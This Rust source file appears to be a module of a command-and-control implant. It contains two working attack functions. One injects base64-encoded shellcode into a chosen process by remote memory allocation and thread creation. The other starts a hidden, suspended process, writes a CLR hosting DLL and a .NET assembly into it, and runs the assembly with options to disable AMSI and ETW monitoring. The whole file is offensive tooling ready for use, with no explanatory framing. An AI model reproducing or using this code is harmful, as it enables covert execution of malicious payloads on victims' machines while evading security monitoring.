extern crate winapi;

use std::os::windows::process::CommandExt;
use std::time::Duration;
use std::thread;
use std::thread::sleep;

use winapi::ctypes::c_void;

pub fn process_injection(args: Vec<&str>) -> String {
    if args.len() < 2 {
        return "please specify PID".to_string()
    }

    let pid = match args[1].parse::<u32>() {
        Err(e)  => return e.to_string(),
        Ok(pid) => pid,
    };
    let shellcode_b64 = args[2];
    let mut shellcode = base64::decode(shellcode_b64).unwrap();
    let shellcode_ptr: *mut c_void = shellcode.as_mut_ptr() as *mut c_void; 

    // get process handle
    let handle = unsafe {winapi::um::processthreadsapi::OpenProcess(
        winapi::um::winnt::PROCESS_ALL_ACCESS,
        0x01,
        pid
    )};

    // alloc payload
    let addr_shellcode = unsafe {winapi::um::memoryapi::VirtualAllocEx(
        handle,
        std::ptr::null_mut(),
        shellcode.len(),
        winapi::um::winnt::MEM_COMMIT,
        winapi::um::winnt::PAGE_READWRITE
    )};
    let mut ret_len: usize = 0;
    let _ = unsafe {winapi::um::memoryapi::WriteProcessMemory(
        handle,
        addr_shellcode,
        shellcode_ptr,
        shellcode.len(),
        &mut ret_len
    )};

    // protect and execute
    let mut old_protect: u32 = 0;
    let _ = unsafe {winapi::um::memoryapi::VirtualProtectEx(
        handle,
        addr_shellcode,
        shellcode.len(),
        winapi::um::winnt::PAGE_EXECUTE_READ,
        &mut old_protect
    )};
    let _ = unsafe {winapi::um::processthreadsapi::CreateRemoteThreadEx(
        handle,
        std::ptr::null_mut(),
        0,
        std::mem::transmute(addr_shellcode),
        0 as _,
        0,
        std::ptr::null_mut(),
        0 as _
    )};

    "success".to_string()
}

pub fn execute_assembly(args: Vec<&str>) -> String {
    if args.len() < 7 {
        return "".to_string()
    }

    // extract arguments
    let assembly_b64 = args[1];
    let assembly = base64::decode(assembly_b64).unwrap();
    let hosting_dll_b64 = args[2];
    let mut hosting_dll = base64::decode(hosting_dll_b64).unwrap();
    let hosting_dll_ptr: *mut c_void = hosting_dll.as_mut_ptr() as *mut c_void; 
    let process = args[3];
    let amsi = match args[4].parse::<bool>() {
        Err(e)  => return e.to_string(),
        Ok(i) => i,
    };
    let etw = match args[5].parse::<bool>() {
        Err(e)  => return e.to_string(),
        Ok(i) => i,
    };
    let offset_u64 = 0x000010B0;
    let params = args[6..].join(" ");
    let mut output_vec: Vec<String> = Vec::new();
    
    // spawn suspended process
    let cmd = std::process::Command::new(process)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW | winapi::um::winbase::CREATE_SUSPENDED)
        .spawn()
        .unwrap();
    let pid = cmd.id();

    // get output
    let (tx, rx) = std::sync::mpsc::channel::<String>();
    thread::spawn(move || {
        match cmd.wait_with_output() {
            Err(e)      => tx.send(format!("{}", e)).unwrap(),
            Ok(output)  => { tx.send(format!("{}{}", 
                String::from_utf8(output.stdout).unwrap(), 
                String::from_utf8(output.stderr).unwrap()))
                .unwrap()
            },
        };
    });

    // get process handle
    let handle = unsafe {winapi::um::processthreadsapi::OpenProcess(
        winapi::um::winnt::PROCESS_ALL_ACCESS,
        0x01,
        pid
    )};

    // construct assembly payload
    // assembly size:   4 bytes
    // params size:     4 bytes
    // AMSI bool:       1 byte
    // ETW bool:        1 byte
    // parameter bytes
    // assembly bytes
    let mut payload: Vec<u8> = Vec::new();
    // assembly size
    let assembly_len_byte_array: [u8; 4] = unsafe {std::mem::transmute((assembly.len() as u32).to_le())};
    payload.extend_from_slice(&assembly_len_byte_array);
    // params size
    let params_len_byte_array: [u8; 4] = unsafe {std::mem::transmute(((params.len() + 1 as usize) as u32).to_le())};
    payload.extend_from_slice(&params_len_byte_array);
    // AMSI
    if amsi {
        payload.extend_from_slice(&[0x01]);
    } else {
        payload.extend_from_slice(&[0x00]);
    }
    // ETW
    if etw {
        payload.extend_from_slice(&[0x01]);
    } else {
        payload.extend_from_slice(&[0x00]);
    }
    // parameters
    payload.extend_from_slice(params.as_bytes());
    payload.extend_from_slice(&[0x00]);
    payload.extend_from_slice(&assembly);
    let payload_ptr: *mut c_void = payload.as_mut_ptr() as *mut c_void; 

    // alloc HostingCLRx64.dll
    let addr_hosting_dll = unsafe{winapi::um::memoryapi::VirtualAllocEx(
        handle,
        0 as _,
        hosting_dll.len(),
        winapi::um::winnt::MEM_COMMIT,
        winapi::um::winnt::PAGE_READWRITE
    )};
    let mut ret_len: usize = 0;
    let _ = unsafe {winapi::um::memoryapi::WriteProcessMemory(
        handle,
        addr_hosting_dll,
        hosting_dll_ptr,
        hosting_dll.len(),
        &mut ret_len
    )};

    // alloc payload
    let addr_assembly = unsafe{winapi::um::memoryapi::VirtualAllocEx(
        handle,
        std::ptr::null_mut(),
        payload.len(),
        winapi::um::winnt::MEM_COMMIT,
        winapi::um::winnt::PAGE_READWRITE
    )};
    let _ = unsafe {winapi::um::memoryapi::WriteProcessMemory(
        handle,
        addr_assembly,
        payload_ptr,
        payload.len(),
        &mut ret_len
    )};

    // protect and execute
    let mut old_protect: u32 = 0;
    let _ = unsafe {winapi::um::memoryapi::VirtualProtectEx(
        handle,
        addr_hosting_dll,
        hosting_dll.len(),
        winapi::um::winnt::PAGE_EXECUTE_READ,
        &mut old_protect
    )};
    let _ = unsafe {winapi::um::memoryapi::VirtualProtectEx(
        handle,
        addr_assembly,
        payload.len(),
        winapi::um::winnt::PAGE_EXECUTE_READ,
        &mut old_protect
    )};
    let mut lp_thread_id: u32 = 0;
    let thread_start_addr = unsafe { addr_hosting_dll.offset(offset_u64) };
    let thread_handle = unsafe {winapi::um::processthreadsapi::CreateRemoteThreadEx(
        handle,
        std::ptr::null_mut(),
        0,
        std::mem::transmute(thread_start_addr),
        addr_assembly,
        0,
        std::ptr::null_mut(),
        &mut lp_thread_id
    )};

    // wait for thread to finish
    loop {
        let mut ret_code: u32 = 0;
        let _ = unsafe {winapi::um::processthreadsapi::GetExitCodeThread(
            thread_handle,
            &mut ret_code
        )};
        if ret_code == winapi::um::minwinbase::STILL_ACTIVE {
            sleep(Duration::from_secs(1));
        } else {
            let _ = unsafe {winapi::um::processthreadsapi::TerminateProcess(handle, 0)};
            match rx.recv() {
                Ok(output)  => output_vec.push(output),
                Err(_)      => output_vec.push("could not get output".to_string()),
            }
            break
        }
    }

    // close process handle
    let _ = unsafe { winapi::um::handleapi::CloseHandle(handle); };

    output_vec.join("\n")
}
